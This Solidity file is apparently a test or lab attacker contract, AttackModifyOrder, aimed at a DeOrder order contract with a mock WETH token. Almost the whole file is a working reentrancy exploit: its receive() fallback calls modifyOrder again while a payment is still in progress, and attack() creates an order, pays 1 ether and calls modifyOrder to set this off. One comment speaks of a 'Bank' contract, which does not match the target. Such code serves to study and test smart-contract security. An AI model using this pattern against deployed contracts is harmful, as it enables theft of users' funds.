import {DeOrder} from "contracts/DeOrder.sol";
import {WETH} from "contracts/mock/WETH.sol";

contract AttackModifyOrder {
    DeOrder public deOrder;
    WETH public weth;
    address token;
    // 初始化Bank合约地址
    constructor(DeOrder _deOrder, WETH _weth,address _token) {
        deOrder = _deOrder;
        weth = _weth;
        token = _token;
    }
    receive() external payable {
        if (weth.totalSupply() >= 1 ether) {
            deOrder.modifyOrder(2, token, 1 ether);
        }
    }
    // 攻击函数
    function attack() external payable {
        deOrder.createOrder(
            0,
            address(this),
            address(0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf),
            address(0),
            100
        );
        deOrder.payOrder{value: 1 ether}(2, 1 ether); // 付款
        deOrder.modifyOrder(2, token, 1 ether);
    }
}
